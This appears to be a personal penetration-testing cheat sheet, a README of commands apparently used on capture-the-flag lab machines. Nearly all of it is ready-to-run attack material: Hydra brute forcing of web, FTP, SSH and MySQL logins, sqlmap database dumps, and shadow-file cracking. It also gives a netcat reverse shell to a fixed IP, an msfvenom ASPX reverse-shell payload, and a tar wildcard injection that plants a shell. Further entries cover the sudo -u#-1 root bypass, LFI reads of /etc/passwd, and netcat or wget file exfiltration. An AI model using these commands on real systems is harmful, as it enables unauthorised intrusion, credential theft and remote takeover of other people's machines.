# HackCmds
Collection of useful penetration testing and hacking commands.

## INDEX :
- [Vulnerability scanner](#vulnerability-scanners)
- [Port enumeration](#port-enumeration)
- [Gobuster Directory Enumeration](#gobuster-directory-enumeration)
- [Metasploit](#metasploit)
- [SQLMAP](#sqlmap)
- [Crack with john](#crack-with-john)
- [Local Server](#local-server)
- [SSH](#ssh)
- [Grep a file](#grep-a-file)
- [Upload a file](#upload-a-file)
- [Hydra Brute Force](#hydra-brute-force)
- [SMB](#smb)
- [Stabilize shell](#stabilize-shell)
- [Usefull bash commands](#usefull-bash-commands)
- [Steganography](#steganography)
- [Hash-identifier](#hash-identifier)
- [LFI](#lfi)
- [Bash reverse shell](#bash-reverse-shell)
- [NFS](#nfs)

----

## NFS

- Enumerate share
````
showmount -e [IP]
````
- Mount a share
````
sudo mount -t nfs IP:share /tmp/mount/ -nolock
````

----

## Vulnerability scanners

- Nikto
````
nikto -h <IP>
nikto -h <IP> -id <USERNAME>:<PASSWORD>
````

- Wapiti
````
wapiti <URL> -n <FORCE 1 to 3>
````

- ZAP
````
./zap
````

----

## Port enumeration
- Quick Scan (Only Ports)
````
rustscan -g --ulimit 5000 -a 192.168.31.113
````

- Intermediate Scan
````
rustscan --ulimit 5000 -a $ip -- -A
````

- Full Scan
````
sudo rustscan  --ulimit 5000 -a 192.168.31.113 -- -A -sN --top-ports 1024 --script=vuln -oX scan.xml --reason --stats-every 5s
xsltproc scan.xml -o scan.html
open scan.html
````
----

## Gobuster Directory Enumeration
- Basic
````
sudo gobuster dir -w <WORDLIST> -u <TARGET IP>
````

- Basic recursive
````
sudo gobuster dir -w <WORDLIST> -u <TARGET IP> -r
````

- With extension
````
sudo gobuster dir -u http://<TARGET IP>/ -w <WORDLIST> -x <EXTENSIONS>
````
----

## Metasploit
- Open console
````
msfconsole
````

- Search for exploit
````
search <SERVICE AND VERSION>
````

- Show options
````
show options
````

- Set the exploit
````
set <EXPLOIT NAME>
````

- Launch the exploit
````
run
````

Usefull exploit :
- mysql_hashdump
- mysql_schemadump

----

## Privilege Escalation

- Linepeas (quick enumeration)
````
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
````

- Find bin with setuid or setgid activated
````
find / -perm +6000 2>/dev/null | grep '/bin/'
````

- Usefull links :

- [GTFOBINS](https://gtfobins.github.io/)

---

## SQLMAP

### Basic Crawl and Detection
- Crawling a site with depth 2, looking for forms, and using batch mode to avoid prompts:
````
sqlmap -u 'http://192.168.31.79/' --crawl=2 --forms --batch
````

### Fetching Database Details

- Test for SQL injection on a specific URL:
````
sqlmap -u "https://example.com/page.php?id=1"
````

- Discover databases on a vulnerable URL:
````
sqlmap -u "https://example.com/page.php?id=1" --dbs
````

### Exploring Specific Databases and Tables

- Fetch tables from a specified database:
````
sqlmap -u 'http://example.com//?page=member&id=1&Submit=Submit#' -D <DATABASE_NAME> --tables
````

- Dump the users table from the Member_Sql_Injection database:
````
sqlmap -u "https://example.com/page.php?id=1" -D <DATABASE_NAME> -T <TABLE_NAME> --dump
````

### Comprehensive Dump

- Dump all tables from the <DATABASE_NAME> database:
````
sqlmap -u 'http://example.com//?page=member&id=1&Submit=Submit#' -D <DATABASE_NAME> --dump-all
````

----

## Crack with john

- ZIP password protected
````
zip2john tocrack.zip > hash.txt
john hash.txt
````

- RSA Passphrase
````
python3 ssh2john <FILE> > <OUTPUT_FILE>
john <OUTPUT_FILE>
john <OUTPUT_FILE> --wordlist=<WORDLIST>
````

- Shadow

Copy passwd and shadow file to local computer, then :
````
unshadow passwd shadow > password.txt
john password.txt
john password.txt --wordlist=<WORDLIST>

````

----

## Local Server

- With netcat
````
nc -lvnp 9000
````

- Web server with Python
````
sudo python3 -m http.server 80
````

----

## SSH

- Upload file
````
scp <FILE> <USERNAME>@<SERVER_IP>:<DESTINATION>
````

- Connect to SSH with idrsa
````
chmod 600 id_rsa
ssh -i <ID_RSA_FILE> <USERNAME>@<SERVER_IP>
````
----

# Grep a file

- **With SSH**
````
scp <USERNAME>@<SERVER_IP>:<FILE> <DESTINATION>
````

- **With NC**

local machine :
````
nc -l -p <port> > file
````
distant machine
````
nc -w 3 <local ip> <port> < file
````

----

# Upload a file

- **SSH**
````
scp <FILE> <USERNAME>@<SERVER_IP>:<DESTINATION>
````

- **Wget**
````
sudo wget --post-file='fichier' <localip>:<port>
````

----

## Hydra Brute Force

- Find Uername / Password WEB (WP / Others)
````
hydra -L <WORDLIST> -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:<FAILED_MESSAGE>" -t 30
````
````
hydra -l <FOUND_USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:<FAILED_MESSAGE>" -t 30
````

- Bruteforce FTP
````
hydra -l chris -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt ftp://10.10.17.164 -V -I
````

- SSH
````
hydra -l <USER> -P <WORDLIST> <IP> ssh -t 4 -V
````

- Basic http
````
hydra -l <FOUND_USERNAME -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt -f <IP> http-get <PROTECTED_DIRECTORY>
````

- Mysql
````
hydra -L <USER_LIST> -P /home/jbertin/Bureau/Hack_Tools/Perso-Script/wordlist/rockyou.txt -f <IP> mysql
````

----

## SMB

````
enum4linux -U -G -S -P <IP>
enum4linux -a <IP>
````

- Get share names :
````
smbclient -L //<IP>
````

- Access to a share
````
smbclient //<IP>/<SHARE_NAME>
````

- Download a file (once connected)
````
get <FILENAME>
````

- Upload a file
````
put <FILENAME>
````

- Other commands
````
ls, 
````

-----

## Stabilize shell

- On victim
````
python -c "import pty; pty.spawn('/bin/bash')"
````

- Press CRTL+Z

- On attacker
````
stty raw -echo && fg
export TERM=xterm-256-color
````

----

## Usefull bash commands

- Find file
````
sudo find / -type f -name "*.txt" -exec grep -H "flag" {} \; 2>/dev/null
````

- Find file
````
find / -type f -name "file.txt" 2>/dev/null
````

- Find bin with setuid or setgid activated (escalation)
````
find / -perm +6000 2>/dev/null | grep '/bin/'
````
- Extract TAR archive
````
tar -xvf <archive.tar>
````

- Bypass command filtration
````
echo $(command)
````

- Locate a file by name
````
locate <FILENAME>
````

- Launch sudo with another user :
````
sudo -u <OTHER_USER> <COMMAND>
````

- Checking security on binary
````
checksec <BINARY>
````

- Recursive search of a term in files
````
grep -r <TOFIND>
````

----

# Steganography

````
binwalk -e <FILE>
````
````
steghide extract -sf <FILE>
````

----

# Hash-identifier

````
hash-id -h <HASH>
````

[HASHES.COM](https://hashes.com/en/decrypt/hash)

[CrackStation](https://crackstation.net/)

----

# LFI

````
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//etc/passwd
````

[Apache log poisoning](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)

----

# Bash reverse shell

````
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.187.74 9000 >/tmp/f
````

-----------------------------------------------------


# TO INCORPORATE

# WPScan
````
wpscan --url http://internal.thm/blog/ --usernames admin --passwords ~/Bureau/Hack_Tools/Perso-Script/wordlist/rockyou.txt
````

# Reverse shell on windows 64, aspx file
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.187.74 LPORT=9000 -f aspx > relevant.aspx

# Privilege escalation windows
- list services
whoami /priv
- SeImpersonatePrivilege abuse
https://github.com/dievus/printspoofer
PrintSpoofer.exe -i -c cmd

#BorgBackup
extraire une backup : borg extract home/field/dev/final_archive/::<nom>

#Tar WildCard Inclusion attack
/1   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/ ( crontabs )

echo "mkfifo /tmp/lhennp; nc <ip> <port> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

#FTP/Samba
Récupérer tout les fichiers d'un coup.
prompt off ( pour éviter que ça demande pour chaque fihier )
mget * ( pour tout récupérer )

#(ALL, !root) NOPASSWD
Sudo ne vérifie pas l'existence de l'identifiant utilisateur spécifié et s'exécute avec un identifiant utilisateur arbitraire avec le sudo priv
-u#-1 renvoie 0 qui est l'identifiant de root.

Syntaxe : sudo -u#-1 ...

#Git hub repo hacking
#1 -> Dumper le repo github en question ( gitdumper.sh http://target.tld/.git/ /home/kali/Document/Dumped ), ( "git log" dans le fichier, pour accéder aux logs des commits git hub )
#2 -> En extraire les données ( extractor.sh /home/kali/Document/Dumped /home/kali/Document/Extracted )
#3 -> Les lires

#Exploit SUDO restriction
sudo -u#-1 <COMMAND>

----
